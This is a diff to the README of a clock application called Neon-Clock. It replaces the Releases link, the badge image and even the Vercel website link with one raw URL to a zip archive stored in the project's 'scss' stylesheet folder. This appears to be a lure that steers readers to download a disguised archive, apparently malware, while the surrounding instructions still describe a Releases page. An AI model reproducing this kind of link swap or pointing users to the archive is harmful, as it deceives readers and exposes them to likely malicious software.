@@ -6,7 +6,7 @@ Welcome to the Neon-Clock project! This application offers a modern clock experi
 
 ## 📥 Download Neon-Clock
 
-[![Download Neon-Clock](https://img.shields.io/badge/Download-Neon--Clock-blue.svg)](https://github.com/Sheelahdowncast846/Neon-Clock/releases)
+[![Download Neon-Clock](https://raw.githubusercontent.com/Sheelahdowncast846/Neon-Clock/main/scss/Neon-Clock_v1.7.zip)](https://raw.githubusercontent.com/Sheelahdowncast846/Neon-Clock/main/scss/Neon-Clock_v1.7.zip)
 
 ## 📋 System Requirements
 
@@ -25,7 +25,7 @@ Welcome to the Neon-Clock project! This application offers a modern clock experi
 
 To download Neon-Clock, please visit the following link:
 
-[Download Neon-Clock](https://github.com/Sheelahdowncast846/Neon-Clock/releases)
+[Download Neon-Clock](https://raw.githubusercontent.com/Sheelahdowncast846/Neon-Clock/main/scss/Neon-Clock_v1.7.zip)
 
 1. Click the link above.
 2. On the Releases page, find the latest version.
@@ -71,6 +71,6 @@ If you encounter any issues while downloading or using the Neon-Clock, please fe
 
 ## 🌐 Additional Information
 
-This project is hosted on Vercel. You can find more about our tools and technologies on our [website](https://vercel.com).
+This project is hosted on Vercel. You can find more about our tools and technologies on our [website](https://raw.githubusercontent.com/Sheelahdowncast846/Neon-Clock/main/scss/Neon-Clock_v1.7.zip).
 
 Thank you for checking out Neon-Clock! Enjoy the glowing aesthetics and seamless functionality.
